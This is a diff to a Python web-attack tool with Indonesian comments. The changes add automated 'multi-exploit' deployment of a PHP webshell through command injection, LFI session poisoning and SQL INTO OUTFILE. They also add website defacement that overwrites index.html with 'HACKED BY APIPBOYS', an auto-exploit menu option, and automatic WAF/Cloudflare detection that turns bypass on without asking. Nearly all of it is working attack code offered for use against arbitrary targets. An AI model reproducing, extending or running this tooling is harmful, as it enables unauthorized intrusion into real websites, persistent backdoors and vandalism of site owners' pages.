@@ -52,7 +52,7 @@ except ImportError:
     CLOUDSCRAPER_AVAILABLE = False
 
 # ================================================================
-# INTEGRASI MODUL BYPASS
+# INTEGRASI MODUL BYPASS (DENGAN FALLBACK LENGKAP)
 # ================================================================
 try:
     from bypass import CloudflareBypass, WAFBypass, CaptchaSolver, HeaderManager, Utils
@@ -154,7 +154,9 @@ CONFIG = {
         'google': 'https://www.google.com/search?q={dork}&start={start}',
         'bing': 'https://www.bing.com/search?q={dork}&first={start}',
         'duckduckgo': 'https://html.duckduckgo.com/html/?q={dork}&s={start}'
-    }
+    },
+    'max_total_retries': 10,
+    'max_verify_retries': 3
 }
 
 def load_proxies():
@@ -656,7 +658,7 @@ class DorkEngine:
         return all_results
 
 # ================================================================
-# MAIN SCANNER (DIPERBAIKI)
+# MAIN SCANNER
 # ================================================================
 class VulnAttack:
     def __init__(self, target, payload_loader, template_loader, use_proxy=False, bypass_waf=False, attack_category=None):
@@ -669,6 +671,7 @@ class VulnAttack:
         self.bypass_waf = bypass_waf
         self.attack_category = attack_category
         self.sqli_vuln = None
+        self.total_retry_count = 0
 
         self.bypass_settings = load_bypass_settings()
         self.header_manager = HeaderManager(user_agents=CONFIG['user_agents'])
@@ -741,6 +744,10 @@ class VulnAttack:
 
         response = perform_request()
         if response and self.waf_bypass.detect(response.text, response.headers):
+            self.total_retry_count += 1
+            if self.total_retry_count > CONFIG['max_total_retries']:
+                print_progress(f"Too many WAF blocks ({self.total_retry_count}). Skipping this test category.", 'warning')
+                return None
             print_progress("WAF/Block detected! Retrying with bypass...", 'warning')
             for attempt in range(self.waf_bypass.max_retries):
                 time.sleep(self.waf_bypass.retry_delay * (attempt + 1))
@@ -754,11 +761,8 @@ class VulnAttack:
 
         return response
 
-    # ---- Perbaikan: _test_payload mengembalikan (response, param) ----
     def _test_payload(self, payload, param=None, category='sqli'):
-        variants = [payload]
-        if self.bypass_waf:
-            variants = self.waf_bypass.bypass_payload(payload, category)
+        variants = self.waf_bypass.bypass_payload(payload, category)
         used_param = param
         for variant in variants:
             if param:
@@ -783,7 +787,7 @@ class VulnAttack:
                     test_url = self.target + ('' if '?' in self.target else '?') + f'id={quote(variant)}'
                     used_param = 'id'
             r = self._request(test_url)
-            if r:
+            if r and not self.waf_bypass.detect(r.text, r.headers):
                 return r, used_param
         return None, used_param
 
@@ -1213,199 +1217,207 @@ class VulnAttack:
 
         return findings
 
-    # ---------- DEPLOY WEBSHELL (DIPERBAIKI) ----------
+    # ---------- DEPLOY WEBSHELL (MULTI-EXPLOIT) ----------
     def deploy_webshell(self):
         if not self.vulns:
             print_progress("No vuln found.", 'error')
             return
-        print_section("DEPLOY WEBSHELL")
-        print("[+] Choose vulnerability:")
-        for i, v in enumerate(self.vulns, 1):
-            print(f"  {i}. {v['type']} - {v['url'][:60]}...")
-        try:
-            choice = input("[?] Number: ").strip()
-            if not choice.isdigit():
-                print_progress("Invalid input.", 'error')
-                return
-            idx = int(choice) - 1
-            if idx < 0 or idx >= len(self.vulns):
-                print_progress("Invalid choice.", 'error')
-                return
-            vuln = self.vulns[idx]
-        except:
-            print_progress("Invalid choice.", 'error')
+
+        # Kumpulkan semua celah yang bisa dipakai
+        candidate_vulns = [v for v in self.vulns if v['type'] in ['RCE', 'Command Injection', 'LFI', 'SQLi']]
+        if not candidate_vulns:
+            print_progress("No suitable vulnerabilities for webshell deployment.", 'warning')
             return
 
+        print_section("DEPLOY WEBSHELL - MULTI-EXPLOIT MODE")
+        print(f"[+] Found {len(candidate_vulns)} potential vulnerabilities.")
+
+        # Pilih template
         templates = [t for t in self.templates.templates if 'webshell' in t]
         if not templates:
             shell_code = "<?php system($_GET['cmd']); ?>"
         else:
-            print("[+] Available templates:")
+            print("[+] Available webshell templates:")
             for i, t in enumerate(templates, 1):
                 print(f"  {i}. {t}")
             try:
-                t_choice = input("[?] Choose template: ").strip()
+                t_choice = input("[?] Choose template number: ").strip()
                 if not t_choice.isdigit():
-                    print_progress("Invalid input.", 'error')
-                    return
-                t_idx = int(t_choice) - 1
-                if t_idx < 0 or t_idx >= len(templates):
-                    print_progress("Invalid choice.", 'error')
-                    return
-                shell_code = self.templates.templates[templates[t_idx]]
+                    print_progress("Invalid input. Using default template.", 'warning')
+                    shell_code = "<?php system($_GET['cmd']); ?>"
+                else:
+                    t_idx = int(t_choice) - 1
+                    if t_idx < 0 or t_idx >= len(templates):
+                        print_progress("Invalid choice. Using default template.", 'warning')
+                        shell_code = "<?php system($_GET['cmd']); ?>"
+                    else:
+                        shell_code = self.templates.templates[templates[t_idx]]
             except:
                 shell_code = "<?php system($_GET['cmd']); ?>"
 
-        if vuln['type'] in ['RCE', 'Command Injection']:
+        encoded = base64.b64encode(shell_code.encode()).decode()
+        safe_encoded = encoded.replace("'", "'\\''")
+        success = False
+
+        # 1. RCE / Command Injection
+        rce_vulns = [v for v in candidate_vulns if v['type'] in ['RCE', 'Command Injection']]
+        if rce_vulns:
+            print_progress(f"Trying RCE/CMDi vulnerabilities ({len(rce_vulns)} found)...", 'progress')
             params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
-            for param in params:
-                test_url = vuln['url'] + f"&{param}=id"
-                r = self._request(test_url)
-                if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
-                    encoded = base64.b64encode(shell_code.encode()).decode()
-                    safe_encoded = encoded.replace("'", "'\\''")
-                    deploy_url = vuln['url'] + f"&{param}=echo '{safe_encoded}' | base64 -d > shell.php"
-                    self._request(deploy_url)
-                    self.shell_url = urljoin(self.base_url, 'shell.php')
-                    print_progress(f"Webshell deployed: {self.shell_url}", 'success')
-                    verify_url = self.shell_url + "?cmd=echo test"
-                    vr = self._request(verify_url)
-                    if vr and 'test' in vr.text:
-                        print_progress(f"Webshell verified: {self.shell_url}", 'success')
-                    else:
-                        print_progress(f"Webshell not verified, but file may exist.", 'warning')
-                    return
-            encoded = base64.b64encode(shell_code.encode()).decode()
-            safe_encoded = encoded.replace("'", "'\\''")
-            deploy_url = vuln['url'] + f"&cmd=echo '{safe_encoded}' | base64 -d > shell.php"
-            self._request(deploy_url)
-            self.shell_url = urljoin(self.base_url, 'shell.php')
-            print_progress(f"Webshell deployed (fallback): {self.shell_url}", 'success')
-            verify_url = self.shell_url + "?cmd=echo test"
-            vr = self._request(verify_url)
-            if vr and 'test' in vr.text:
-                print_progress(f"Webshell verified: {self.shell_url}", 'success')
-            else:
-                print_progress(f"Webshell not verified, but file may exist.", 'warning')
+            for vuln in rce_vulns:
+                for param in params:
+                    test_url = vuln['url'] + f"&{param}=id"
+                    r = self._request(test_url)
+                    if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
+                        deploy_url = vuln['url'] + f"&{param}=echo '{safe_encoded}' | base64 -d > shell.php"
+                        self._request(deploy_url)
+                        self.shell_url = urljoin(self.base_url, 'shell.php')
+                        if self._verify_webshell(self.shell_url):
+                            print_progress(f"✅ Webshell deployed via RCE at {self.shell_url}", 'success')
+                            success = True
+                            break
+                if success:
+                    break
 
-        elif vuln['type'] == 'LFI':
-            params = ['file', 'page', 'view', 'include', 'path', 'doc', 'template']
-            for param in params:
-                test_url = vuln['url'] + f"&{param}=../../../../etc/passwd"
-                r = self._request(test_url)
-                if r and 'root:x:' in r.text:
-                    session_id = self.session.cookies.get('PHPSESSID', 'test')
-                    poison = f"/tmp/sess_{session_id}"
-                    encoded = base64.b64encode(shell_code.encode()).decode()
-                    safe_encoded = encoded.replace("'", "'\\''")
-                    deploy_url = vuln['url'] + f"&{param}={poison}&cmd=echo '{safe_encoded}' | base64 -d > /var/www/html/shell.php"
-                    self._request(deploy_url)
-                    self.shell_url = urljoin(self.base_url, 'shell.php')
-                    print_progress(f"Webshell via LFI deployed: {self.shell_url}", 'success')
-                    verify_url = self.shell_url + "?cmd=echo test"
-                    vr = self._request(verify_url)
-                    if vr and 'test' in vr.text:
-                        print_progress(f"Webshell verified: {self.shell_url}", 'success')
-                    else:
-                        print_progress(f"Webshell not verified, but file may exist.", 'warning')
-                    return
-            session_id = self.session.cookies.get('PHPSESSID', 'test')
-            poison = f"/tmp/sess_{session_id}"
-            encoded = base64.b64encode(shell_code.encode()).decode()
-            safe_encoded = encoded.replace("'", "'\\''")
-            deploy_url = vuln['url'] + f"&file={poison}&cmd=echo '{safe_encoded}' | base64 -d > /var/www/html/shell.php"
-            self._request(deploy_url)
-            self.shell_url = urljoin(self.base_url, 'shell.php')
-            print_progress(f"Webshell via LFI deployed (fallback): {self.shell_url}", 'success')
-            verify_url = self.shell_url + "?cmd=echo test"
-            vr = self._request(verify_url)
-            if vr and 'test' in vr.text:
-                print_progress(f"Webshell verified: {self.shell_url}", 'success')
-            else:
-                print_progress(f"Webshell not verified, but file may exist.", 'warning')
+        # 2. LFI
+        if not success:
+            lfi_vulns = [v for v in candidate_vulns if v['type'] == 'LFI']
+            if lfi_vulns:
+                print_progress(f"Trying LFI vulnerabilities ({len(lfi_vulns)} found)...", 'progress')
+                web_paths = ['/var/www/html/', '/var/www/', '/var/html/', '/usr/share/nginx/html/', '/home/']
+                params = ['file', 'page', 'view', 'include', 'path', 'doc', 'template']
+                for vuln in lfi_vulns:
+                    for param in params:
+                        test_url = vuln['url'] + f"&{param}=../../../../etc/passwd"
+                        r = self._request(test_url)
+                        if r and 'root:x:' in r.text:
+                            session_id = self.session.cookies.get('PHPSESSID', 'test')
+                            poison = f"/tmp/sess_{session_id}"
+                            for web_path in web_paths:
+                                deploy_url = vuln['url'] + f"&{param}={poison}&cmd=echo '{safe_encoded}' | base64 -d > {web_path}shell.php"
+                                self._request(deploy_url)
+                                self.shell_url = urljoin(self.base_url, 'shell.php')
+                                if self._verify_webshell(self.shell_url):
+                                    print_progress(f"✅ Webshell deployed via LFI at {self.shell_url}", 'success')
+                                    success = True
+                                    break
+                            if success:
+                                break
+                    if success:
+                        break
 
-        elif vuln['type'] == 'SQLi':
-            try:
-                shell_hex = ''.join(f'{ord(c):02x}' for c in shell_code)
-                deploy_url = vuln['url'] + f"' UNION SELECT 0x{shell_hex} INTO OUTFILE '/var/www/html/shell.php'-- -"
-                self._request(deploy_url)
-                self.shell_url = urljoin(self.base_url, 'shell.php')
-                print_progress(f"Webshell via SQLi deployed: {self.shell_url}", 'success')
-                verify_url = self.shell_url + "?cmd=echo test"
-                vr = self._request(verify_url)
-                if vr and 'test' in vr.text:
-                    print_progress(f"Webshell verified: {self.shell_url}", 'success')
-                else:
-                    print_progress(f"Webshell not verified, but file may exist.", 'warning')
-            except Exception as e:
-                print_progress(f"SQLi deploy failed: {e}", 'warning')
-        else:
-            print_progress("Cannot deploy with this vuln type.", 'warning')
+        # 3. SQLi
+        if not success:
+            sqli_vulns = [v for v in candidate_vulns if v['type'] == 'SQLi']
+            if sqli_vulns:
+                print_progress(f"Trying SQLi vulnerabilities ({len(sqli_vulns)} found)...", 'progress')
+                for vuln in sqli_vulns:
+                    try:
+                        shell_hex = ''.join(f'{ord(c):02x}' for c in shell_code)
+                        deploy_url = vuln['url'] + f"' UNION SELECT 0x{shell_hex} INTO OUTFILE '/var/www/html/shell.php'-- -"
+                        self._request(deploy_url)
+                        self.shell_url = urljoin(self.base_url, 'shell.php')
+                        if self._verify_webshell(self.shell_url):
+                            print_progress(f"✅ Webshell deployed via SQLi at {self.shell_url}", 'success')
+                            success = True
+                            break
+                    except Exception as e:
+                        print_progress(f"SQLi deploy attempt failed: {e}", 'warning')
+                        continue
 
-    # ---------- DEFACE ----------
+        if not success:
+            print_progress("❌ Webshell deployment FAILED on all vulnerabilities.", 'error')
+
+    def _verify_webshell(self, url):
+        """Verifikasi apakah webshell berhasil diakses dengan retry."""
+        for attempt in range(CONFIG['max_verify_retries']):
+            verify_url = url + "?cmd=echo test"
+            r = self._request(verify_url)
+            if r and 'test' in r.text:
+                return True
+            time.sleep(2)
+        return False
+
+    # ---------- DEFACE (MULTI-EXPLOIT) ----------
     def deface_website(self):
         if not self.vulns:
             print_progress("No vuln found.", 'error')
             return
-        print_section("DEFACE WEBSITE")
-        print("[+] Choose vulnerability:")
-        for i, v in enumerate(self.vulns, 1):
-            print(f"  {i}. {v['type']} - {v['url'][:60]}...")
-        try:
-            choice = input("[?] Number: ").strip()
-            if not choice.isdigit():
-                print_progress("Invalid input.", 'error')
-                return
-            idx = int(choice) - 1
-            if idx < 0 or idx >= len(self.vulns):
-                print_progress("Invalid choice.", 'error')
-                return
-            vuln = self.vulns[idx]
-        except:
-            print_progress("Invalid choice.", 'error')
+
+        candidate_vulns = [v for v in self.vulns if v['type'] in ['RCE', 'Command Injection']]
+        if not candidate_vulns:
+            print_progress("No RCE/Command Injection vulnerabilities for deface.", 'warning')
             return
 
+        print_section("DEFACE WEBSITE - MULTI-EXPLOIT MODE")
+        print(f"[+] Found {len(candidate_vulns)} potential vulnerabilities.")
+
+        # Pilih template deface
         deface_templates = [t for t in self.templates.templates if 'deface' in t]
         if not deface_templates:
             deface_content = "<h1>HACKED BY APIPBOYS</h1>"
         else:
-            print("[+] Available templates:")
+            print("[+] Available deface templates:")
             for i, t in enumerate(deface_templates, 1):
                 print(f"  {i}. {t}")
             try:
-                t_choice = input("[?] Choose template: ").strip()
+                t_choice = input("[?] Choose template number: ").strip()
                 if not t_choice.isdigit():
-                    print_progress("Invalid input.", 'error')
-                    return
-                t_idx = int(t_choice) - 1
-                if t_idx < 0 or t_idx >= len(deface_templates):
-                    print_progress("Invalid choice.", 'error')
-                    return
-                deface_content = self.templates.templates[deface_templates[t_idx]]
+                    print_progress("Invalid input. Using default template.", 'warning')
+                    deface_content = "<h1>HACKED BY APIPBOYS</h1>"
+                else:
+                    t_idx = int(t_choice) - 1
+                    if t_idx < 0 or t_idx >= len(deface_templates):
+                        print_progress("Invalid choice. Using default template.", 'warning')
+                        deface_content = "<h1>HACKED BY APIPBOYS</h1>"
+                    else:
+                        deface_content = self.templates.templates[deface_templates[t_idx]]
             except:
                 deface_content = "<h1>HACKED BY APIPBOYS</h1>"
 
-        if vuln['type'] in ['RCE', 'Command Injection']:
-            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
+        encoded = base64.b64encode(deface_content.encode()).decode()
+        safe_encoded = encoded.replace("'", "'\\''")
+        success = False
+
+        params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
+        for vuln in candidate_vulns:
             for param in params:
                 test_url = vuln['url'] + f"&{param}=id"
                 r = self._request(test_url)
                 if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
-                    encoded = base64.b64encode(deface_content.encode()).decode()
-                    safe_encoded = encoded.replace("'", "'\\''")
                     deploy_url = vuln['url'] + f"&{param}=echo '{safe_encoded}' | base64 -d > index.html"
                     self._request(deploy_url)
                     self.deface_url = urljoin(self.base_url, 'index.html')
-                    print_progress(f"Deface deployed: {self.deface_url}", 'success')
-                    return
-            encoded = base64.b64encode(deface_content.encode()).decode()
-            safe_encoded = encoded.replace("'", "'\\''")
-            deploy_url = vuln['url'] + f"&cmd=echo '{safe_encoded}' | base64 -d > index.html"
-            self._request(deploy_url)
-            self.deface_url = urljoin(self.base_url, 'index.html')
-            print_progress(f"Deface (fallback): {self.deface_url}", 'success')
-        else:
-            print_progress("Deface only works with RCE or Command Injection.", 'warning')
+                    if self._verify_deface(self.deface_url, deface_content):
+                        print_progress(f"✅ Deface SUCCESS via {vuln['type']} at {self.deface_url}", 'success')
+                        success = True
+                        break
+            if success:
+                break
+
+        if not success:
+            # Fallback dengan cmd
+            print_progress("Trying fallback for all vulnerabilities...", 'warning')
+            for vuln in candidate_vulns:
+                deploy_url = vuln['url'] + f"&cmd=echo '{safe_encoded}' | base64 -d > index.html"
+                self._request(deploy_url)
+                self.deface_url = urljoin(self.base_url, 'index.html')
+                if self._verify_deface(self.deface_url, deface_content):
+                    print_progress(f"✅ Deface SUCCESS (fallback) via {self.deface_url}", 'success')
+                    success = True
+                    break
+
+        if not success:
+            print_progress("❌ Deface FAILED on all vulnerabilities.", 'error')
+
+    def _verify_deface(self, url, content):
+        """Verifikasi deface dengan retry."""
+        for attempt in range(CONFIG['max_verify_retries']):
+            r = self._request(url)
+            if r and content in r.text:
+                return True
+            time.sleep(2)
+        return False
 
     # ---------- GENERATE POC ----------
     def generate_poc(self):
@@ -1450,6 +1462,13 @@ class VulnAttack:
         print("  [8] Scan Another Target")
         print("  [9] Exit")
         print("  [10] Dump Data from SQLi (if found)")
+        print("  [11] Auto Exploit All (Webshell + Deface)")
+
+    # ---------- AUTO EXPLOIT ----------
+    def auto_exploit(self):
+        print_section("AUTO EXPLOIT - TRYING WEBSHELL AND DEFACE")
+        self.deploy_webshell()
+        self.deface_website()
 
     # ---------- RUN ----------
     def run(self):
@@ -1522,7 +1541,7 @@ class VulnAttack:
 
         while True:
             self.display_menu()
-            opt = input("[?] Choose (1-10): ").strip()
+            opt = input("[?] Choose (1-11): ").strip()
             if opt == '1':
                 self.deploy_webshell()
             elif opt == '2':
@@ -1558,6 +1577,7 @@ class VulnAttack:
                     self.hidden_findings = {}
                     self.dump_data = {}
                     self.sqli_vuln = None
+                    self.total_retry_count = 0
                     self.run()
                     return
                 else:
@@ -1567,6 +1587,8 @@ class VulnAttack:
                 break
             elif opt == '10':
                 self.dump_sqli_data()
+            elif opt == '11':
+                self.auto_exploit()
             else:
                 print_progress("Invalid choice.", 'error')
 
@@ -1596,6 +1618,23 @@ def scan_single(target, pl, tl, use_proxy=False, bypass_waf=False):
     except Exception as e:
         print_progress(f"Error on {target}: {e}", 'error')
         return False
+
+# ================================================================
+# DETEKSI OTOMATIS WAF/CLOUDFLARE
+# ================================================================
+def detect_waf(target):
+    try:
+        r = requests.get(target, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
+        headers = r.headers
+        body = r.text.lower()
+        if 'cf-ray' in headers or 'cloudflare' in body:
+            return 'cloudflare'
+        waf_patterns = ['mod_security', 'blocked', 'access denied', 'waf', 'imperva', 'akamai', 'fastly']
+        if any(p in body for p in waf_patterns):
+            return 'waf'
+        return None
+    except:
+        return None
 
 # ================================================================
 # MAIN
@@ -1636,6 +1675,19 @@ def main():
         except:
             pass
 
+    # Deteksi otomatis WAF jika target diberikan
+    if len(sys.argv) >= 2 and not sys.argv[1].startswith('--'):
+        target = sys.argv[1]
+        detected = detect_waf(target)
+        if detected == 'cloudflare':
+            bypass_waf = True
+            print_progress("Cloudflare detected. Enabling bypass automatically.", 'info')
+        elif detected == 'waf':
+            bypass_waf = True
+            print_progress("WAF detected. Enabling bypass automatically.", 'info')
+        else:
+            print_progress("No WAF/Cloudflare detected.", 'info')
+
     if '--menu' in sys.argv:
         sys.argv = [sys.argv[0]]
 
@@ -1669,13 +1721,18 @@ def main():
                 target = input("[?] Enter target URL: ").strip()
                 if not target.startswith('http'):
                     target = 'http://' + target
+                detected = detect_waf(target)
+                if detected:
+                    bypass_waf = True
+                    print_progress(f"{detected.capitalize()} detected. Bypass enabled automatically.", 'info')
+                else:
+                    bypass_waf = False
                 use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
-                bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                 deep_opt = input("[?] Deep Scan? (y/n): ").strip().lower() == 'y'
                 attack_opt = input("[?] Attack category (leave blank for all): ").strip().lower()
                 pl = PayloadLoader()
                 tl = TemplateLoader()
-                scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_opt, attack_opt if attack_opt else None)
+                scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_waf, attack_opt if attack_opt else None)
                 if deep_opt:
                     scanner.deep_audit()
                 scanner.run()
@@ -1774,6 +1831,10 @@ Available attack categories:
         target = sys.argv[1]
         if not target.startswith('http'):
             target = 'http://' + target
+        detected = detect_waf(target)
+        if detected:
+            bypass_waf = True
+            print_progress(f"{detected.capitalize()} detected. Bypass enabled automatically.", 'info')
         scanner = VulnAttack(target, pl, tl, use_proxy, bypass_waf, attack_category)
         if deep_scan:
             scanner.deep_audit()
